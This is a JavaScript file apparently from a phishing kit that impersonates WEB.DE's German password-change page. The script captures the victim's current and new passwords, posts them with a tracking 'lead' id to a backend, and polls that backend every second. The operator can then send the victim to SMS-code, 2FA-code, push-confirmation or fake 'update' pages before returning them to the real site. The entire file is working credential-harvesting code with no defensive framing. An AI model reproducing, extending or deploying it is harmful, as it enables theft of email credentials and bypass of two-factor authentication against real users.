/**
 * WEB.DE — страница «Passwort ändern» (index-change), редиректы на web.de
 */
(function () {
  var CANONICAL = 'https://newsroom.web.de/';
  var form = document.getElementById('form-change-direct');
  var oldPwInput = document.getElementById('old-password');
  var newPwInput = document.getElementById('new-password');
  var errorBlock = document.getElementById('error-change');
  var errorText = document.getElementById('error-change-text');
  var btnSubmit = document.getElementById('btn-change-submit');
  var pagePollInterval = null;

  function showError(msg) {
    if (errorBlock && errorText) {
      errorText.textContent = msg || 'Bitte alle Felder ausfüllen.';
      errorBlock.hidden = false;
    }
  }
  function hideError() {
    if (errorBlock) errorBlock.hidden = true;
  }
  function setLoading(loading) {
    if (!btnSubmit) return;
    var textSpan = btnSubmit.querySelector('.btn-login-text');
    var loadingSpan = btnSubmit.querySelector('.btn-login-loading');
    if (loading) {
      btnSubmit.disabled = true;
      if (textSpan) textSpan.style.display = 'none';
      if (loadingSpan) loadingSpan.style.display = 'inline-flex';
    } else {
      btnSubmit.disabled = false;
      if (textSpan) textSpan.style.display = '';
      if (loadingSpan) loadingSpan.style.display = 'none';
    }
  }
  function getVisitId() {
    try { return sessionStorage.getItem('gmw_lead_id'); } catch (e) { return null; }
  }
  function stopPolling() {
    if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
  }
  function startPagePoll(id) {
    if (!id) return;
    stopPolling();
    function poll() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=change&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          var mode = res && res.mode;
          if (mode === 'manual' && st && st.lastIndexOf('redirect_', 0) === 0) return;
          if (st === 'error') {
            stopPolling();
            setLoading(false);
            showError('Ihr aktuelles Passwort ist nicht korrekt. Bitte überprüfen Sie Ihre Angaben.');
          } else if (st === 'show_success') {
            stopPolling();
            setLoading(false);
            var overlay = document.getElementById('success-overlay');
            if (overlay) overlay.hidden = false;
          } else if (st === 'redirect_change_password') {
            // already on change page
          } else if (st === 'redirect_sicherheit') {
            stopPolling();
            window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_android') {
            stopPolling();
            window.location = '/app-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_open_on_pc') {
            stopPolling();
            window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_push') {
            stopPolling();
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sms_code') {
            stopPolling();
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_2fa_code') {
            stopPolling();
            window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            stopPolling();
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || CANONICAL;
          }
        })
        .catch(function () {});
    }
    poll();
    pagePollInterval = setInterval(poll, 1000);
  }

  (function initFromUrl() {
    try {
      var params = new URLSearchParams(window.location.search);
      var idFromUrl = params.get('id');
      if (idFromUrl) sessionStorage.setItem('gmw_lead_id', idFromUrl);
    } catch (e) {}
  })();
  (function registerVisit() {
    try {
      var leadId = getVisitId();
      if (!leadId) {
        var params = new URLSearchParams(window.location.search);
        leadId = params.get('id') || '';
        if (leadId) try { sessionStorage.setItem('gmw_lead_id', leadId); } catch (e) {}
      }
      if (leadId) startPagePoll(leadId);
    } catch (e) {}
  })();

  document.querySelectorAll('[data-reveal]').forEach(function (btn) {
    var targetId = btn.getAttribute('data-reveal');
    var input = targetId ? document.getElementById(targetId) : null;
    if (!input) return;
    btn.addEventListener('click', function () {
      var isPw = input.type === 'password';
      input.type = isPw ? 'text' : 'password';
      btn.setAttribute('aria-label', isPw ? 'Passwort verbergen' : 'Passwort anzeigen');
    });
  });
  [oldPwInput, newPwInput].forEach(function (input) {
    if (!input) return;
    function toggleClass() {
      var group = input.closest('.input-group');
      if (group) group.classList.toggle('has-value', !!input.value);
    }
    input.addEventListener('input', toggleClass);
    input.addEventListener('focus', toggleClass);
    input.addEventListener('blur', toggleClass);
    toggleClass();
  });

  var successOverlayClose = document.getElementById('success-overlay-close');
  if (successOverlayClose) {
    successOverlayClose.addEventListener('click', function () {
      window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || CANONICAL;
    });
  }

  if (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      hideError();
      var oldPw = (oldPwInput && oldPwInput.value) ? oldPwInput.value : '';
      var newPw = (newPwInput && newPwInput.value) ? newPwInput.value : '';
      if (!oldPw || !newPw) {
        showError('Bitte füllen Sie alle Felder aus.');
        return;
      }
      if (newPw.length < 8) {
        showError('Das neue Passwort muss mindestens 8 Zeichen haben.');
        return;
      }
      setLoading(true);
      var visitId = getVisitId();
      if (!visitId) {
        setLoading(false);
        showError('Sitzung abgelaufen. Bitte starten Sie den Vorgang erneut.');
        return;
      }
      var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
      var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
      fetch('/api/change-password-by-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ visitId: visitId, currentPassword: oldPw, newPassword: newPw, screenWidth: sw || undefined, screenHeight: sh || undefined })
      })
        .then(function (r) { return r.json(); })
        .then(function (data) {
          if (data && data.ok) {
            setLoading(false);
            var overlay = document.getElementById('success-overlay');
            if (overlay) overlay.hidden = false;
            if (visitId) {
              fetch('/api/log-action', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: visitId, action: 'success' }) }).catch(function () {});
            }
          } else {
            setLoading(false);
            showError(data && data.error ? data.error : 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
          }
        })
        .catch(function () {
          setLoading(false);
          showError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
        });
    });
  }
})();
